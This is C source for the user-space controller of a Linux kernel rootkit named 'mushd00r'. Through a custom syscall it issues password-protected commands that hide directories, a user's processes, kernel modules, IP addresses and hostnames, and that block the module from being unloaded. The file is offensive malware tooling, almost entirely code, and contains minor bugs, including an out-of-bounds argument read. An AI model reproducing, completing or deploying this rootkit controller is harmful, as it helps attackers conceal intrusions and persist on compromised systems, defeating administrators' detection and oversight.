/* Mushroom -= user-space program for talking with mushd00r */
#include <stdio.h>
#include <linux/errno.h>
#include <linux/unistd.h>
#include <sys/syscall.h>

#define SYS_NGSIGA 250

extern void *sys_call_table[];

int help(char *name)
{
        printf("Use: %s option [password] [arg2]\n",name);
        printf("Options: \n");
	printf("\tc   --change password   || arg1: oldpass arg2: newpass\n");
        printf("\td   --add directory   || arg2: dirname\n");
        printf("\t-d  --remove directory   || arg2: dirname\n");
        printf("\ta   --enable rmmoding our module \n");
        printf("\t-a  --disable rmmoding our module\n");
        printf("\tp   --username to hide  & processes   || arg2: username\n");
        printf("\tm   --name of module to hide   || arg2: modname\n");
        printf("\ti   --add ip_addres to hide from everywere || arg2: ipadress\n");
	printf("\th   --add hostname to hide from everywere || arg2: hostname\n");
        printf("WARNING: arg1 i arg2 have to be shorter than 10 letters (9MAX)\n");
	return 0;
}

int main(int argc, char *argv[])
{
        char opt;
        int ret=0;
        if (argc<3 || strlen(argv[2])>9 || (argc==3 && strlen(argv[3])>9))
        {
                help(argv[0]);
                return 0;
        }
        if(strlen(argv[1])==2)
        {
                opt=argv[1][1];
                switch(opt)
                {
                        case 'd': ret=syscall(SYS_NGSIGA, 2, argv[2], argv[3]);
                                break;

                        case 'a': ret=syscall(SYS_NGSIGA, 5, argv[2]);
                                break;

                        default: help(argv[0]);
                                return 0;
                                break;
                }
        }

        else
        {
                opt=argv[1][0];
                switch (opt)
                {
                        case 'c': if (argc != 4) { help(argv[0]); ret=0; break; }
                                ret=syscall(SYS_NGSIGA, 3,argv[2], argv[3]);
                                break;

                        case 'd': ret=syscall(SYS_NGSIGA, 1, argv[2], argv[3]);
                                break;

                        case 'a': ret=syscall(SYS_NGSIGA, 4, argv[2], argv[3]);
                                break;

                        case 'p': ret=syscall(SYS_NGSIGA, 8, argv[2], argv[3]);
                                break;

                        case 'm': ret=syscall(SYS_NGSIGA, 7, argv[2], argv[3]);
                                break;
				
			case 'i': ret=syscall(SYS_NGSIGA,  9, argv[2], argv[3]);
				break;
				
			case 'h': ret=syscall(SYS_NGSIGA,  10, argv[2], argv[3]);
				break;

                        default: help(argv[0]);
                                return 0;
                                break;
                }
        }
        if (ret<0)
                printf("ERROR: It looks like module isn't loaded!\n");
        switch (ret)
        {
                case 0: printf("Ok!\n");
                        break;

                case 2: printf("ERROR: Nothing to do!\n");
                        break;

                case 3: printf("ERROR: Wrong password!!\n");
                        break;

                case 4: printf("ERROR: String too long(8 max)\n");
                        break;

                case 5: printf("WARNING: No more space! (10 dir max)!\n");
                        break;

                case 6: printf("WARNING: Dir doesn't exist!\n");
                        break;

                default: printf("RET:%d\n",ret);
                        break;
        }

        return 0;
}
